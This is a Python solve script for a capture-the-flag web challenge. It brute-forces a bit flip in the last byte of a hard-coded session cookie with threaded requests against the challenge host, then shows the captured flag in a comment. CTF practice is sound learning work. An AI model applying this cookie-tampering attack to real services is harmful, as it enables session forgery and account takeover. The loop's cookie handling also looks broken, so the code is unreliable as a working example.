# reference: https://brycec.me/posts/dicectf_at_hope_2022_writeups

import requests
from base64 import b64decode, b64encode
import threading as tr

URL = "https://payment-pal.mc.ax"
usr_cookie = "lgrGI/RTFsAycniwB2phRDVjkAY8FQ=="
remnant_cookie = ".IQ8TKyIE6xAZAd9+zss+VA==.X377gVOFooPi+lYhKYiFOg=="

def bit_flip(cookie, byte):
    cookie = b64decode(cookie)
    last_bit = cookie[-1]
    pop_cookie = cookie[:-1]
    return b64encode(pop_cookie + bytes(chr(last_bit ^ byte), "latin-1")).decode("utf-8")+remnant_cookie

def req(cookie, url=URL):
    r = requests.get(url, cookies={"session": cookie})
    if "Welcome!" in r.text:
        print(cookie)
    return None

def thread_req(cookie, url=URL):
    tr.Thread(target=req, args=(cookie, url)).start()
    
def brute_force(cookie, url=URL):
    for _byte in range(256):
        cookie = bit_flip(cookie, _byte)
        thread_req(cookie, url)
        if _byte % 10 == 0:
            print(_byte, end="\r")
                

def main():
    brute_force(usr_cookie)

if __name__ == "__main__":
    main()


# {"data":{"flag":"hope{pp=payment-pal=prototype-pollution!!!}"}}